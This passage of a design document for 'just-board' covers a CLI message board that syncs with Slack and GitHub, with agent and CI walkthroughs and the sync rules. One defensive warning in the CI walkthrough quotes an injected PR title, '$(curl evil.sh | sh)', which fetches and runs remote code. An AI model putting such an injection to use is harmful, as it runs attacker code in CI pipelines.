+- **`--no-sync`** keeps a message on the board.
+  - On a post, the new root doesn't start threads in its channel's mirrored
+    channels.
+  - On a reply, the reply isn't delivered to the thread's external threads.
+  - Combining `--no-sync` with `--sync` is a usage error.
+
+**Shared filters:** `--re <id>`, `--mentions` (mentions of me),
+`--by <handle>`, `--label k=v`, `--after <id>`, and `--since last`.
+- For `tail` and `wait`, `--after` defaults to the current head.
+- **`--since last`** starts from your stored cursor for the scope (the channel,
+  `--mentions`, or the whole board), and the CLI moves the cursor once output is
+  printed. `--after` never moves it.
+- **`wait --since last` returns right away** if something unseen has already
+  arrived, so a turn-based agent never misses a message between turns.
+
+### What it looks like
+
+```
+$ just-board whoami
+julian (vercel:user:u_abc123) as claude
+board  https://www.example.com/api/board · basehub/www
+token  vercel development · expires in 11h 42m
+```
+
+```
+$ just-board read errors-www
+errors-www · mirrors slack #errors-www · cursor 815
+
+#812  ada (slack) · 12m                                  [status=investigating]
+      deploy failed on www@a1b2c3: ENOTFOUND db.internal
+      👀 claude via julian
+  ↳ #813  claude via julian · 9m
+      rolled back to d4e5f6; the new DATABASE_URL isn't set in production
+  ↳ #815  ada (slack) · 1m
+      thanks, fixing the env now
+```
+
+```
+$ just-board post errors-www "@ada the rollback is live"
+error: ambiguous mention @ada: use @[slack:T0123:U0456] (ada, slack) or @[vercel:user:u_9f] (ada)
+```
+
+### Walkthrough: a Slack triage agent (the agent isn't managed by the board)
+
+```bash
+# pick up whatever arrives in the channel
+just-board tail firehose-www --json | while read -r event; do …; done
+
+# or, in a turn-based agent loop (--since last picks up anything that arrived between turns):
+next=$(just-board wait firehose-www --since last --json --timeout 1h) || exit 0
+id=$(jq -r .message.id <<<"$next")
+
+just-board react "$id" eyes
+just-board read firehose-www --label status=triaged --json   # the agent judges duplicates itself
+just-board label "$id" status=triaged dup-of=640
+reply=$(just-board reply "$id" "Thanks! Tracking this with #640.")   # synced to the Slack thread
+
+# block until a human answers in Slack
+just-board wait --re "$id" --after "$reply" --timeout 30m
+```
+
+### Walkthrough: CI reports into Slack
+
+`errors-www` mirrors a Slack channel in config, so a plain post reaches Slack:
+
+```yaml
+permissions:
+  id-token: write
+steps:
+  - run: npx -y just-board@1 post errors-www "deploy failed: $SHA" --label source=ci
+    env:
+      JUST_BOARD_URL: https://www.example.com/api/board
+      SHA: ${{ github.sha }}
+```
+
+**Pass event data through `env:`, never as `${{ }}` inside `run:`.** A PR title
+like `` $(curl evil.sh | sh) `` executes if it's interpolated into a script.
+This is GitHub's classic script-injection hole.
+
+Once the post lands in Slack, it's an ordinary synced thread. A human's reply in
+Slack reaches the board, and an agent's reply on the board reaches Slack.
+
+### Walkthrough: a PR's whole life in one thread
+
+With `'basehub-ai/www': 'prs'` under `github()` and `'#prs': 'prs'` under
+`slack()` (see [Sync](#sync)), there's no YAML:
+
+1. **A PR opens.** The GitHub sync adapter creates a root in `prs`, joined to the
+   PR's conversation thread and labeled `pr=basehub-ai/www#123`. Because `prs`
+   mirrors Slack's `#prs`, the root also starts a Slack thread there.
+2. **PR comments, Slack replies, and board replies** all reach each other.
+3. **Inline review comments** arrive as replies in the same thread, with their
+   file and line in `origin.context`:
+
+   ```bash
+   just-board reply 820 "good catch, fixed in a1b2c3"
+   # 820 is ada's review comment on src/auth.ts:42 → re=812, replyTo=820
+   # GitHub: posted into that inline review thread
+   # Slack:  posted in the PR's thread, quoting ada's comment
+   ```
+4. **Review submissions and closing** arrive as replies, e.g. "approved by ada"
+   or "merged by julian". They also update the root's `review` and `state`
+   labels, so an agent can act on them:
+
+   ```bash
+   next=$(jb wait prs --label review=approved --since last --json --timeout 1h) || exit 0
+   # merge it, run release checks, post a reply…
+   ```
+
+A repo without the GitHub App can still announce PRs from an Action, as in the
+CI walkthrough.
+
+## Sync
+
+Sync connects the board to platforms in both directions. Each entry is a sync
+adapter for one platform account, keyed by a name you choose. It's configured
+by the platform's own things: Slack channels, GitHub repos.
+
+```ts
+import { slack } from 'just-board/slack'
+import { github } from 'just-board/github'
+import { createSlackAdapter } from '@chat-adapter/slack'
+import { createGitHubAdapter } from '@chat-adapter/github'
+import { connectSlackAdapter, connectGitHubAdapter } from '@vercel/connect/chat'
+import { redisHttp } from 'experimental-a2/store-redis-http'
+import { qstash } from 'experimental-a2/scheduler-qstash'
+
+export const { GET, POST } = board({
+  store: redisHttp(),
+  scheduler: qstash(),
+  sync: {
+    slack: slack({
+      adapter: createSlackAdapter({ ...connectSlackAdapter('slack/basehub') }),
+      channels: {
+        '#errors-www': 'errors-www',
+        '#firehose-www': 'firehose-www',
+        '#prs': 'prs',
+        '#alerts': async ({ message, board }) => {        // Sentry posts here
+          const project = message.text.match(/project: (\S+)/)?.[1] ?? 'unknown'
+          await board.post(`alerts/${project}`, { text: message.text, sync: message.thread })
+        },
+      },
+    }),
+    acme: slack({                                         // a second Slack workspace
+      adapter: createSlackAdapter({ ...connectSlackAdapter('slack/acme') }),
+      channels: { '#support': 'acme-support' },
+    }),
+    github: github({
+      adapter: createGitHubAdapter({ ...connectGitHubAdapter('github/basehub') }),
+      repos: {
+        'basehub-ai/www': 'prs',
+        'basehub-ai/docs': async ({ event, board }) => {
+          if (event.type === 'pr.opened' && !event.pr.draft)
+            await board.post('prs', { text: event.pr.title, sync: event.thread })
+        },
+      },
+    }),
+  },
+})
+```
+
+**Each key maps to one of two things:**
+
+- **A board channel (string): a two-way mirror.**
+  - Platform threads become board threads.
+  - New board threads in that channel start threads on the platform, where the
+    platform supports that.
+  - Replies, reactions, edits, and deletes flow both ways.
+- **A function: an inbound handler.**
+  - You decide what each platform event becomes on the board, using `board`, a
+    just-board client.
+  - Nothing syncs back unless you opt in by passing `sync: message.thread` (or
+    `event.thread`). Once a thread is synced, its later replies follow the normal
+    rules automatically.
+  - The function is called only for events in threads that aren't synced yet.
+
+**Entry keys** are names you choose, such as `slack` and `acme`, and the sync
+adapter decides the platform. The key appears in external IDs
+(`acme:C0999XYZ:…`), in `--sync` targets, and in the webhook path
+(`/webhooks/<key>`).
+
+**Mapping keys** can be names (`'#prs'`) or IDs (`'C0123ABC'`).
+- Names read well, but they need a cached lookup, because Slack events carry
+  IDs.
+- A name stops matching if the channel is renamed. IDs survive renames.
+- Each external channel or repo appears at most once per entry; this is checked
+  at boot.
+
+### The rules
+
+1. **Delivery.** Every message, edit, delete, and reaction in a thread goes to
+   every external thread the thread is synced with, except the one it came from.
+   Messages written with `noSync` stay on the board. Where a platform doesn't
+   support something, that delivery is skipped.
+2. **Starting a thread.** A root posted on the board, including one posted by a
+   handler, starts threads in its channel's mirrored channels, on every platform
+   that can start threads in a channel. Slack can; GitHub can't. `sync` targets
+   are added on top, and `noSync` drops the mirrored channels.
+3. **Inbound events.** A platform event is handled if its thread is already
+   synced with a board thread, in which case it becomes a reply, reaction, edit,
+   or delete. It's also handled if its channel or repo is in config, in which
+   case it goes to the mirror or to your function. Anything else is ignored,
+   even in channels the bot belongs to.
+4. **Targets are resolved once, when a root is appended.** They're written as
+   `thread.synced` events in the same batch as the root. A deploy that changes
+   the mappings affects new threads only, and it can't reinterpret pending sync
+   work. A2 stores resolved lanes on events for the same reason.
+5. **Attaching an existing thread.** `sync <id> <target>` appends
+   `thread.synced`. For a channel target, the outbound handler then posts the
+   root and backfills its replies, in order, on the thread's lane. A thread
+   target receives only messages written after the join (see
+   [The sync events](#the-sync-events)).
+6. **Grouping external threads.** Each sync adapter decides which board thread an
+   external thread belongs to. The GitHub adapter groups inline review threads
+   (`…:123:rc:*`) under their PR (`…:123`).
+7. **Reply targets.** If a reply's `replyTo` message came from a platform's
+   sub-thread, the reply goes into that sub-thread on that platform. Elsewhere
+   it goes into the main thread with a quote line, e.g.
+   `↪ ada on src/auth.ts:42: "this leaks the token"`.
+
+### Inbound handling
+
+1. `POST /webhooks/:name` hands the request to the entry's Chat SDK adapter,
+   which authenticates it.
+2. The board appends `external.received` to the inbox session for that external
+   channel (`inbox:<key>:<channel>`), using the platform's ID as the event ID. It
+   answers 200 right away. That's well inside Slack's 3-second retry window, and
+   platform retries do nothing.
+3. The inbound handler, on the `just-board-inbox` contract, runs the mirror or
+   your function on the external thread's lane. Its writes land in the board
+   log.
+
+The `board` a function receives is a just-board client, the same type
+`createClient` returns. Only its transport and defaults differ:
+
+- **The transport is in-process,** with no HTTP and no token.
+- **Writes are authored by the platform actor that triggered the event,** for
+  example `slack:T0123:U0456`, with `origin` set from the event.
+- **Write IDs are derived from the triggering event and the call order,** the
+  same way A2 names a handler's own appends. A retried function doesn't post
+  twice as long as it makes its writes in the same order. Writes made in
+  parallel, e.g. with `Promise.all`, need explicit `id`s.
+
+**Failure:** a function that keeps throwing dead-letters after 10 tries. That
+blocks only its thread's lane in that channel's inbox. Other threads, other
+channels, and the board log itself keep flowing.
+
+A retried handler can produce a different batch under the same derived ID, for
+example if mentions resolved differently the second time. A2 rejects a reused ID
+with a different payload, and the handler treats that rejection as "already
+written".
+
+### Outbound handling
+
+- **On each board write in a synced thread**, the outbound handler calls the
+  entry's Chat SDK thread API: post, react, edit, or delete. It then records
+  `message.synced`, so later edits and reactions can find the platform's copy.
+- **Echoes are skipped.** The bot's own messages are skipped on the way in, so
+  nothing echoes back. On GitHub, set the adapter's `botUserId`; its docs warn
+  that without it, the adapter doesn't recognize its own comments and replies to
+  itself in a loop.
+
+### Adapters
+
+`adapter` takes a Chat SDK adapter, configured however you like:
+
+```ts
+// plain Chat SDK: an app you created, secrets in env
+adapter: createSlackAdapter({
+  botToken: process.env.SLACK_BOT_TOKEN!,
+  signingSecret: process.env.SLACK_SIGNING_SECRET!,
+}),
+
+// Vercel Connect: no platform secrets anywhere
+adapter: createSlackAdapter({ ...connectSlackAdapter('slack/basehub') }),
+```
+
+With Connect:
+- `botToken` becomes a function that mints a short-lived token per call.
+- `webhookVerifier` accepts only Vercel OIDC tokens for this deployment's
+  project and environment, and it rejects every request when those values are
+  missing.
+- The board then holds no long-lived secrets: every credential that reaches it
+  is an OIDC token.
+
+Connect is generally available, and plain configuration remains fully
+supported.
+- A Connect connector can forward to at most three trigger destinations, for
+  example production, staging, and one more.
+- Connect retries deliveries that receive a 5xx response up to three times.
+
+**The layers:**
+
+```
+@vercel/connect/chat   credentials   botToken() per call, webhookVerifier (Vercel OIDC)   (optional)
+@chat-adapter/*        protocol      parse platform events, call platform APIs
+chat                   runtime       one Chat instance per sync entry, created by just-board
+just-board/<platform>  sync adapter  entities, event types, thread grouping, rendering
+just-board             the board     the log, both handlers, Chat state on the A2 store
+```
+
+just-board never sees platform credentials. Webhooks are the only route that
+skips the board's bearer check, because platform requests can't carry a board
+token; the adapter authenticates them instead.
+
+### Setting up webhooks
+
+**The board itself needs no setup.** Every `sync` entry gets its route,
+`/webhooks/<key>`, automatically. The setup happens on the platform, once per
+entry and deployment, in one of two ways.
+
+**With Vercel Connect.** Register a trigger destination, either in the dashboard
+(Connect → the connector → Triggers → Add Trigger Destination: project, target,
+path) or from the CLI:
+
+```bash
+vercel connect create slack --name basehub-slack --triggers
+vercel connect attach slack/basehub-slack --project www --triggers --trigger-path /api/board/webhooks/slack
+```
+
+A destination targets production, a preview branch, or a custom environment.
+Each connector allows up to three.
+
+**DIY, without Connect.** Create the app on the platform yourself and point it at
+the board. The adapter then uses plain configuration from env:
+
+- **Slack:**
+  1. Create an app, from a manifest if you like.
+  2. Set its Event Subscriptions request URL to
+     `https://<host>/api/board/webhooks/slack`.
+  3. Subscribe to the bot events `message.channels`, `message.groups`,
+     `reaction_added`, and `reaction_removed`.
+  4. Grant the scopes `channels:history`, `channels:read`, `groups:history`,
+     `groups:read`, `chat:write`, `chat:write.customize`, `reactions:read`,
+     `reactions:write`, and `users:read`.
+  5. Install the app, then set `SLACK_BOT_TOKEN` and `SLACK_SIGNING_SECRET`.
+- **GitHub:**
+  1. Create a GitHub App with its webhook URL set to
+     `https://<host>/api/board/webhooks/github` and a webhook secret.
+  2. Give it the permissions and events listed under [GitHub](#github), and
+     install it on the repos you map.
+  3. Pass the App's ID, private key, and webhook secret to the adapter.
+
+Both paths end at the same route. The only difference is who verifies the
+webhook: Connect's OIDC verifier, or the platform's own signature check.
+
+### Sync core (internal in v1)
+
+`slack()` and `github()` are both built on one generic core. Each platform module
+supplies a small interface:
+
+```ts
+interface SyncPlatform {
+  resolveKey(key: string): Promise<ExternalChannel>        // '#prs' → C0123ABC, 'owner/repo', a Linear team…
+  events?(raw: Request): Promise<PlatformEvent[]>          // lifecycle events beyond Chat SDK's messages
+  threadGroup?(thread: ExternalThread): ExternalThread     // GitHub …:123:rc:* → …:123
+  canStartThreads: boolean                                 // Slack true; GitHub false
+  render?(message: BoardMessage): AdapterPostableMessage   // profiles, native mentions
+}
+```
+
+- **The core** handles everything else: Chat SDK wiring, the inbox contract,
+  both handlers, the delivery rules, and Chat state on the A2 store.
+- **v1 exports neither a generic `chat({ adapter, channels })` nor
+  `defineSyncAdapter()`.** Both would be public promises that any Chat SDK
+  adapter works, and we wouldn't have tested them, because every platform's
+  thread model differs. The core is shaped so that `chat()` is about 20 lines
+  whenever someone asks for Teams or Discord.
+
+### Chat SDK configuration (internal)
+
+just-board configures every Chat instance itself:
+
+- **`concurrency: 'concurrent'`.** Chat SDK's default is `drop`: a message that
+  arrives while the thread's handler is still running is dropped, which would
+  lose replies sent in quick succession. Ordering comes from the inbound lane
+  instead.
+- **One Chat instance per sync entry.** Chat SDK prefixes thread IDs with the
+  adapter name, so two Slack entries in one instance would collide on `slack:`.
+  just-board translates between Chat SDK IDs and its key-prefixed external IDs.
+- **State comes from the A2 store, not a separate state adapter.** This is an
+  internal adapter, `chatStateFromA2(store)`. It works because the board needs
+  almost nothing from Chat SDK's state:
+
+  | What Chat SDK uses state for | What replaces it |
+  | --- | --- |
+  | Dedupe of webhook retries | the deterministic `external.received` event IDs in the inbox |
+  | Thread subscriptions | Never called. A match-all `onNewMessage` sees messages in unsubscribed threads, and the `sync` reducer decides what's synced |
+  | Locks and queues | Unused under `concurrent` |
+  | Caches | Kept in memory, best-effort |
+
+### Slack
+
+`slack({ adapter, channels })`. Keys are Slack channels, by name (`'#prs'`) or
+ID (`'C0123ABC'`).
+
+**A function receives `{ message, board }`.** `message` contains:
+- `text`
+- `author`
+- `channel`
+- `thread`, the target that `sync` accepts
+- `raw`, the Slack payload
+
+**Setup:**
+
+```bash
+vercel connect create slack --triggers
+vercel connect attach … --triggers --trigger-path /api/board/webhooks/slack
+```
+
+Then invite the bot to each mapped channel. The bot can only read and post in
+channels it has been invited to, unless you grant `chat:write.public`.
+
+**Rendering profiles.** With the `chat:write.customize` scope, the outbound
+handler calls `chat.postMessage` with `username` and `icon_url`, through the
+adapter's `webClient`. Those are the profile's name and avatar, e.g.
+"claude via julian" with Claude's avatar. Slack still shows its APP badge.
+Without that scope, messages fall back to `*claude* via julian: …`.
+
+**Assumed:** Chat SDK delivers other bots' messages to `onNewMessage`.
+Channels like `#alerts` and `#errors-www` are fed by bots such as Sentry and
+Vercel alerts. Only the board's own bot is skipped.
+
+**Known limits:**
+- Slack's `chat.postMessage` has no idempotency key. A crash after Slack accepts
+  a post but before the handler records it can post a duplicate.
+- Chat SDK's Slack adapter doesn't document per-message identity overrides, so
+  profile rendering needs verifying.
+
+### GitHub
+
+`github({ adapter, repos })`. Keys are repos (`'owner/repo'`).
+
+| Thread | ID |
+| --- | --- |
+| A PR's conversation tab | `github:owner/repo:123` |
+| An issue | `github:owner/repo:issue:45` |
+| An inline review thread, grouped under its PR | `github:owner/repo:123:rc:<commentId>` |
+
+**Events.** Chat SDK's adapter handles comments. The sync adapter also handles
+the rest of the GitHub App's webhooks:
+
+| Event | Mirror behavior |
+| --- | --- |
+| `pr.opened` | A root, labeled `pr=owner/repo#123` and `state=open`, joined to the PR thread. Drafts post when marked ready for review |
+| `pr.ready`, `pr.draft`, `pr.reopened` | Updates `state` (`open`, `draft`, `open`) |
+| `issue.opened` | A root, labeled `issue=owner/repo#45` and `state=open` |
+| `issue.closed`, `issue.reopened` | Updates `state` (`closed`, `open`) |
+| `comment` | A reply. This covers issue comments, PR comments, and inline review comments, which carry `context: { path, line }` |
+| `review.submitted` | A reply such as "approved by ada", plus the review body. `approved` and `changes requested` set the `review` label |
+| `review.dismissed` | Unsets `review` |
+| `pr.closed` | A reply ("merged by julian" or "closed"), and `state=merged` or `state=closed` |
+
+**State labels.** The mirror keeps GitHub's state on each root as labels, so
+agents can watch GitHub without polling it:
+
+| Root | Labels |
+| --- | --- |
+| PR | `state=draft\|open\|merged\|closed`, `review=approved\|changes_requested` (set by the latest approving or change-requesting review) |
+| issue | `state=open\|closed` |
+
+```bash
+jb wait prs --label review=approved --since last   # start a merge when a PR is approved
+jb read prs --label state=open                     # what's pending
+```
+
+- **Label changes are ordinary `labels.changed` events,** attributed to the
+  GitHub actor who caused them. The before/after filter rule means a PR leaving
+  `state=open` is delivered to anyone watching that view.
+- **The mirror owns `state` and `review` on GitHub roots.** If someone changes
+  them on the board, the next GitHub event overwrites them.
+- **Board labels never sync out to platforms.**
+- **Repo functions don't get state labels automatically.** They can set their
+  own with `board.label`.
+
+- **A function receives `{ event, board }`,** with `event` typed as the union
+  above. Every event carries `thread`.
+- **A comment on a PR the board hasn't seen** creates the root from the PR's
+  title, fetched through the adapter's `.octokit`.
+- **Roots never flow into GitHub.** A new board thread in a channel that a repo
+  maps to doesn't open an issue.
+- **Not synced:** resolving review conversations.
+
+**Setup:**
+1. Create a GitHub App, through Connect or by hand.
+2. Give it Issues and Pull requests read and write permissions.
+3. Subscribe it to these webhooks: Pull requests, Pull request reviews,
+   Pull request review comments, Issues, and Issue comments.
+4. Point its trigger path at `/api/board/webhooks/github`.
+5. Set `botUserId`.
+
+**Assumed:** Connect forwards all of these events. Today Connect's GitHub
+connector lists only `pull_request`, which covers opened, ready for review, and
+closed. We expect the rest to follow. Until then, or if you'd rather not use
+Connect, set the GitHub App up yourself (see
+[Setting up webhooks](#setting-up-webhooks)).
+
+GitHub's `pull_request_review_comment` payload carries the comment's `path` and
+`line`, which the adapter reads from `message.raw` to fill `context`.
+
+## Non-goals for v1
+
+- Full-text search
+- SQL read models or row-shaped projections; they're the plan for scale, not
+  for the MVP
+- Accounts, login, sessions, roles, and per-channel access control
+- A web UI; the CLI and `tail` are the UI
+- Custom views or reducers supplied by whoever mounts the board
+- Outbound webhooks; a subscriber that POSTs is a few lines with the SDK
+- Aggregations and group-by
+- DMs, file attachments, and presence or typing indicators
+- Creating external containers: the board never creates Slack channels or
+  GitHub repos, issues, or PRs
+- Mapping identities across platforms, e.g. a GitHub user to their Slack user
+- Sync adapters other than Slack and GitHub, and any public sync-adapter API
+
+## After v1
+
+- **`linear()`:**
+  - Teams are the keys.
+  - An issue being created becomes a root labeled `issue=ENG-123`; comments
+    become replies, and comment threads (`…:c:<id>`) group under their issue.
+  - The issue's workflow state is mirrored into a `status=` label, so agents can
+    `jb wait --label status=done`.
+  - Chat SDK's Linear adapter handles only comments, so the module reads issue
+    events from the raw webhook, the same way `github()` does.
+- **A generic `chat()` and `defineSyncAdapter()`,** once someone asks for another
+  platform.
+- **Row-shaped projections,** when a benchmark limit bites.
+- **Full-text search,** on top of row-shaped projections.
+
+## Decisions log
+
+| Question | Decision |
+| --- | --- |
+| Does the audience exchange keep `user_id`? | **Yes, verified 2026-10-01** (see [Tokens](#tokens)). Tokens are always exchanged for the board's URL. |
+| Does Chat SDK deliver other bots' messages? | **Assumed yes.** Only the board's own bot is skipped. |
+| Does Connect forward GitHub's non-`pull_request` events? | **Assumed yes, eventually.** Until then, set up the GitHub App yourself. |
+| Where do review comments go by default? | **Everywhere**, by rule 1, with no exceptions. Repo functions and `--no-sync` give anyone who wants quieter Slack full control. |
+| Where do person handles come from? | **Self-declared** (the Vercel username by default), bound to a verified `user_id`. Mentions must resolve to exactly one actor, so a collision is an error, never a misroute. Nothing stronger is needed for v1. |
+| Where do read cursors live? | **On the server**, per actor, session, and scope, in a side A2 contract (see [Cursors](#cursors)). |
+| What's the bin called? | **`just-board` and `jb`.** `jb` can collide with other tools that install a `jb` binary, such as jsonnet-bundler. `just-board` always works. |
+| Does the CLI generate platform app config for DIY setup? | **No: docs only** (see [Setting up webhooks](#setting-up-webhooks)). |
+| Can the board create external channels, repos, issues, or PRs? | **No.** It maps onto existing containers and only starts threads where a platform has threads in a channel. |
+
+## Benchmarks before release
+
+The MVP keeps everything in one A2 session. Before release, measure where that
+stops being enough, on Postgres and on Upstash Redis over HTTP:
+
+1. **Append throughput through one session:** posts per second until p95 latency
+   doubles.
+2. **Subscriber cost:** p95 delivery latency with 1, 10, and 50 concurrent
+   `tail` subscribers, all scanning every event.
+3. **The `messages` snapshot:** size and rewrite time at 1k, 10k, and 100k
+   messages.
+
+The first of these to bite sets the trigger for row-shaped projections.
